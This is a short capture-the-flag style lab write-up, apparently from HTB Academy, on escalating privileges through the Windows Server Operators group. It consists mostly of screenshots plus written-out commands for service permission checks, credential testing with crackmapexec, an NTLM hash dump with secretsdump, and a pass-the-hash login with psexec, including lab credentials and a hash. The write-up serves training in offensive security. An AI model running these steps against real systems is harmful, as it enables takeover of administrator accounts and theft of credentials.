# [Server Operators](Server%20Operators.md)
### Escalate privileges using the methods shown in this section and submit the contents of the flag located at c:\Users\Administrator\Desktop\ServerOperators\flag.txt

Querying AppReadiness service
![](Screenshot%202026-08-19%20at%2014.49.17.png)

Checking Service Permissions

```cmd
c:\Tools\PsService.exe security AppReadiness
```
![](Screenshot%202026-08-19%20at%2014.49.56.png)

Checking Admin local group memberships
![](Screenshot%202026-08-19%20at%2014.51.25.png)

Modifying the Service binary Path
![](Screenshot%202026-08-19%20at%2014.52.15.png)

Starting the service
![](Screenshot%202026-08-19%20at%2014.53.15.png)

Confirming Local Admin Group Membership
![](Screenshot%202026-08-19%20at%2014.53.35.png)

```shell
crackmapexec smb 10.129.118.173 -u server_adm -p "HTB_@cademy_stdnt!"
```
![](Screenshot%202026-08-19%20at%2014.54.57.png)

Now retrieve NTLM Password Hash

```shell
secretsdump.py server_adm@10.129.118.173 -just-dc-user administrator
```
![](Screenshot%202026-08-19%20at%2014.57.29.png)

Let's passthehash

```shell
psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:7796ee39fd3a9c3a1844556115ae1a54 administrator@10.129.118.173
```
